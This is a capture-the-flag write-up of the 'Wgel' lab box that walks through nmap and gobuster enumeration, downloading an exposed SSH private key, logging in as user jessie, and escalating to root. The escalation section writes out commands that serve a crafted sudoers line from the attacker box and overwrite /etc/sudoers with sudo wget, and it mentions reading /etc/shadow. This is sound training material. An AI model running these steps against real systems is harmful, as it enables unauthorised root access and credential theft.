# Wgel CTF

## Objective
- Achieve root 

## Target
- IP: 10.130.144.130

## Enumeration
### Network

- Scan performed:

```bash 
	nmap -sV -sC -oN nmap.txt TARGET_IP
 ```
- Open Ports: 
	We can see immediately that ports 22 for SSH and port 80 for HTTP
	In many assessments, when you see just these two, the most probable attack surface is the web service

### Web

- I did a quick visit to our target site and discovered a default ubuntu page
- Upon inspection, I found a comment that mentioned a user name Jessie so I took note of that
- Next up fired a gobuster scan at our target and found a hidden endpoint on /sitemap, before looking at anything cos I was too attached to my terminal at the time decided to fire another directory bust on the sitemap endpoint to further find anymore potential endpoints. 
And I did - /sitemap/.ssh
- I visited the endpointed to find an id_rsa file and everything went smooth sail from there
- I quickly saved it on my computer using
```bash
wget http://TARGET_IP/sitemap/.ssh/id_rsa
```
   and then ran this command
```bash
	chmod 400 id_rsa
```
This is to make the id_rsa file acceptable by ssh by securing the read and permissions to only you.

Using this new found knowledge I went back to the other dude that was discovered by nmap

## Initial Access

- Using the combo of the info we found earlier
- I simply had to use the discovered username and private key to authenticate over SSH with:
```bash
 ssh -i id_rsa jessie@TARGET_IP
``` 
and boom, we're in 😁

- I quickly did some basic enumeration 
```bash 
	uname -a
	hostname
	cat /proc/version
	pwd
```
- Now to get our user flag
```bash
 ls -R
```
The flag was located in the Documents directory

## Privilege Escalation
- I checked the commands Jessie could execute with elevated privileges
```text
 sudo -l
```
We see that we can run wget command without a passwd as root

- I got it wrong at first, stumbling in the dark and on GTFOBins.org for a privesc vector
I previously used sudo wget to try and read ```/etc/shadow``` but the hash I found was practically uncrackable so I knew I had it wrong. After some research and a few hintings I figured out what the privesc was. 

- I had to use wget to overwrite a very important file that is owned by root. Reviewing where the information and set permissions of jessie came from after running the ``` sudo -l ``` came from, it was the /etc/sudoers file. Given that wget can run as root and without password. If I could download a file that wrote to that file and changed things up a bit, what would happen?

- Once that idea clicked, I headed over to my attackbox and 
```bash
 echo 'jessie ALL=(ALL:ALL) NOPASSWD: ALL' > payload
 python3 -m http.server 8000
```
This would write our intended permissions(root) to a file name payload and then serve up our current directory containing that file over http on port 8000

- Back on my target box I then abused the wget privileges by doing
```bash
 sudo wget ATTACKBOX_IP:8000/payload -O /etc/sudoers
```
 This would download our payload file over http and output it to the /etc/sudoers file. Because `wget` is executing with root privileges, it can overwrite `/etc/sudoers` as root. The payload changes Jessie's sudo permissions to `NOPASSWD: ALL`.
 And that was it, my permissions in the sudoers file were set in stone 😈😈
- If we run the 
```bash
 sudo -l
 ```
 command again, we can see that we now have access to do everything without a password as root.
- If we wanted we could simply su to root without a password, change root password or just simply look into /root to find our flag waiting for us to cat it out

## Attack Chain

1. Enumerate exposed services
2. Inspect HTTP service
3. Discover exposed username
4. Enumerate /sitemap
5. Discover /.ssh/id_rsa
6. Use discovered username + private key for SSH access
7. Enumerate sudo privileges
8. Identify root-level wget execution
9. Abuse wget's output functionality to modify /etc/sudoers
10. Obtain root privileges


## Mistakes / Dead Ends

- I did try cracking the hash from /etc/shadow, but quickly hit a wall
- It appeared that simply reading the contents of a file wasn't the intended attack chain but rather, writing to one
- It's the man pages that I should have paid more attention to, would have saved me a lot of computing power 🥲


## Methodology Improvements

- After discovering an unusual privileged binary, read its relevant manual/help options before searching for an exploit.
- Treat powerful file read/write capabilities as separate primitives.
- When a service exposes credentials or keys, immediately correlate them with discovered usernames and available authentication services.
- Keep a running attack-chain hypothesis instead of independently testing every interesting artifact.














